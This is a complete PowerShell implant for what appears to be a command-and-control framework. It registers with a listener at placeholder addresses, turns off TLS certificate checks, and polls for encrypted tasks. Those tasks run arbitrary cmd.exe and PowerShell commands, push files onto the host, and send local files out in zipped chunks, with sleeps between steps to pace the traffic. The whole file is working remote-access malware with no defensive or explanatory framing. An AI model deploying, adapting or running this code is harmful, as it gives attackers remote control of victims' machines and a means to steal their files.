function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    # Write-Host $key
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

function shell($fname, $arg){
    
    $pinfo                        = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName               = $fname
    $pinfo.RedirectStandardError  = $true
    $pinfo.RedirectStandardOutput = $true
    $pinfo.UseShellExecute        = $false
    $pinfo.Arguments              = $arg
    $p                            = New-Object System.Diagnostics.Process
    $p.StartInfo                  = $pinfo
    
    $p.Start() | Out-Null
    $p.WaitForExit()
    
    $stdout = $p.StandardOutput.ReadToEnd()
    $stderr = $p.StandardError.ReadToEnd()

    $res = "VALID $stdout`n$stderr"
    $res
}

# Bypassign selfsigned certs error
add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

$ip   = "XXX_listener_ip_placeholder_XXX"
$port = "XXX_listener_port_placeholder_XXX"
## secrets.token_hex(32)
## secrets.token_urlsafe(32)
$key  = "XXX_listener_key_placeholder_XXX"
$n    = 2
$name = ""
$code = ""

$hname = [System.Net.Dns]::GetHostName()
$hname  = Encrypt-String $key $hname
$type  = "powershell"
$type  = Encrypt-String $key $type
$regl  = ("http" + ':' + "//$ip" + ':' + "$port/beacon/register")
$data  = @{
    name = "$hname" 
    type = "$type"
    }
$ret  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
$ret = Decrypt-String $key $ret
$ret = $ret.split()
$flag = $ret[0]
if ($flag -eq "VALID"){
    $name = $ret[1]
    $key = $ret[2]
}
sleep $n

$resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/")
$uploadl = ("http" + ':' + "//$ip" + ':' + "$port/upload/")
$downloadl = ("http" + ':' + "//$ip" + ':' + "$port/downloads/")


for (;;){

    $taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
    
    ### check response NOT existence
    $taskId = ""
    $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
    # Write-Host $task
    
    if (-Not [string]::IsNullOrEmpty($task)){
        
        $task = Decrypt-String $key $task
        # Write-Host $task
        $task = $task.split()
        $flag = $task[0]
        
        if ($flag -eq "VALID"){
            
            $taskId = $task[1]
            $decoded_command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($task[2]))
            $decoded_command = $decoded_command.split()
            $command = $decoded_command[0]
            $args = $decoded_command[1..$decoded_command.Length]

            if ($command -eq "shell"){
            
                $f    = "cmd.exe"
                $arg  = "/c "
            
                foreach ($a in $args){ $arg += $a + " " }

                $res  = shell $f $arg
                $res  = Encrypt-String $key $res
                $data = @{result = "$res"}

                $resultfl = ("$resultl" + "$taskId")
                
                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'

            }
            elseif ($command -eq "powershell"){
            
                $f    = "powershell.exe"
                $arg  = "/c "
            
                foreach ($a in $args){ $arg += $a + " " }

                $res  = shell $f $arg
                $res  = Encrypt-String $key $res
                $data = @{result = "$res"}

                $resultfl = ("$resultl" + "$taskId")
                
                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'

            }
            elseif ($command -eq "sleep"){

                $n    = [int]$args[0]
                $res = "sleep set to " + "$args" + "sec"
                $res  = Encrypt-String $key $res
                $data = @{result = "$res"}
                $resultfl = ("$resultl" + "$taskId")
                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
            }
            elseif ($command -eq "rename"){
                
                $name    = $args[0]
                $res = "VALID agent renamed to " + "$name"
                $res  = Encrypt-String $key $res
                $data    = @{result = "$res"}
                $resultfl = ("$resultl" + "$taskId")
                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
            }
            elseif ($command -eq "upload"){
                $file    = $args
                $uploadfl = ("$uploadl" + "$file")
                $init = "VALID init"
                $init  = Encrypt-String $key $init
                $data    = @{
                    part = "$init"
                    name = "$name"
                    }
                $total_parts = (Invoke-WebRequest -UseBasicParsing -Uri $uploadfl -Body $data -Method 'POST').Content
                $total_parts = Decrypt-String $key $total_parts
                $xx = $total_parts.split()
                if ($xx[0] -eq 'VALID') {
                    if (Test-Path "$file") {
                        Remove-Item -Recurse -Force "$file"
                    }
                    for ($i=0; $i -le $xx[1]-1; $i=$i+1 ) {
                        # keep sleeping during exfil
                        sleep $n

                        $part = "VALID " + "$i"
                        $part  = Encrypt-String $key $part                        
                        $data    = @{
                            part = "$part"
                            name = "$name"
                            }
                        $part = (Invoke-WebRequest -UseBasicParsing -Uri $uploadfl -Body $data -Method 'POST').Content
                        $dec_part_b64 = (Decrypt-String $key $part )
                        if ($dec_part_b64.split()[0] -eq 'VALID') {
                            $bytes = [System.Convert]::FromBase64String($dec_part_b64.split()[1])
                            add-content -value $bytes -encoding byte -path "$file"
                        }
                    }
                    $final_file = "$file".Substring(0, "$file".lastIndexOf('.'))
                    if (Test-Path "$final_file") {
                        Remove-Item -Recurse -Force "$final_file"
                    }
                    Expand-Archive -Path "$file" -DestinationPath .
                    Remove-Item -Recurse -Force "$file"

                    $res = "VALID file downloaded - " + "$final_file"
                    $res  = Encrypt-String $key $res
                    $data    = @{result = "$res"}
                    $resultfl = ("$resultl" + "$taskId")
                    Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
                }
            }
            elseif ($command -eq "download"){
                $file = $args
                if ( "$file".contains('\') ){
                    $file_name = "$file".split('\')[-1]
                } else {
                    $file_name = $file
                }
                if (-not( Test-Path -LiteralPath "$file" -PathType leaf)) {
                    $res = "VALID - File " + "$file_name" + " not found!"
                    $res  = Encrypt-String $key $res
                    $data    = @{result = "$res"}
                    $resultfl = ("$resultl" + "$taskId")
                    Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
                } else {
                    $f_hash = Get-FileHash -Algorithm SHA1 -LiteralPath "$file" | Select -ExpandProperty Hash
                    $zip_name = "$file" + ".zip"
                    Compress-Archive -LiteralPath "$file" -Force -DestinationPath "$zip_name" -CompressionLevel Optimal
                    $file_bin = Get-Content -Encoding Byte -Raw -Path "$zip_name"

                    $lenght = $file_bin.Length
                    $chunks_size = 200
                    $init = "VALID init " + "$f_hash"
                    $init  = Encrypt-String $key $init
                    $total_chunks = [math]::ceiling($lenght/$chunks_size)
                    $enc_len = "VALID " + "$total_chunks"
                    $enc_len  = Encrypt-String $key $enc_len
                    $data = @{
                        info = "$init"
                        name = "$name"
                        chunk = "$enc_len"
                    }
                    $downloadfl = ("$downloadl" + "$file_name")


                    ### use file ID instead of f_hash !!!!
                    $file_id = Invoke-WebRequest -UseBasicParsing -Uri $downloadfl -Body $data -Method 'POST'
                    $res = Decrypt-String $key $file_id
                    $flag = $res.split()[0]
                    sleep $n
                    if ($flag -eq "VALID") {
                        $fid = $res.split()[1]
                        $fid = "VALID " + "$fid"
                        $fid = Encrypt-String $key "$fid"
                        
                        $taskId_enc = "VALID " + "$taskId"
                        $taskId_enc = Encrypt-String $key "$taskId"

                        if ($lenght -le $chunks_size){
                            $file_b64 = [System.Convert]::ToBase64String($file_bin)
                            $part = "VALID 0 " + "$f_hash"
                            $part  = Encrypt-String $key "$part"
                            $content = "VALID " + "$file_b64"
                            $content  = Encrypt-String $key "$content"
                            $data = @{
                                info = "$part"
                                name = "$name"
                                fid = "$fid"
                                taskid = "$taskId_enc"
                                chunk = "$content"
                            }
                            Invoke-WebRequest -UseBasicParsing -Uri $downloadfl -Body $data -Method 'POST'
                        } else {
                            for ($i=0; $i -lt $total_chunks; $i++) {
                                $chunk_b64 = [System.Convert]::ToBase64String($file_bin[($i*$chunks_size)..($i*$chunks_size+199)])
                                $part = "VALID " + "$i" + " " + "$f_hash"
                                $part  = Encrypt-String $key "$part"
                                $content = "VALID " + "$chunk_b64"
                                $content  = Encrypt-String $key "$content"
                                if ($i -eq $total_chunks-1) {
                                    $data = @{
                                        info = "$part"
                                        name = "$name"
                                        fid = "$fid"
                                        chunk = "$content"
                                        taskid = "$taskId_enc"
                                    }
                                } else {
                                    $data = @{
                                    info = "$part"
                                    name = "$name"
                                    fid = "$fid"
                                    chunk = "$content"
                                    }    
                                }
                                Invoke-WebRequest -UseBasicParsing -Uri $downloadfl -Body $data -Method 'POST'
                                sleep $n
                            }
                        }
                    }

                }
            }

            elseif ($command -eq "quit"){
                $res = "VALID agent dead " + "$name"
                $res  = Encrypt-String $key $res
                $data    = @{result = "$res"}

                $resultfl = ("$resultl" + "$taskId")
                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'

                exit
            }
        }
    }
    sleep $n
}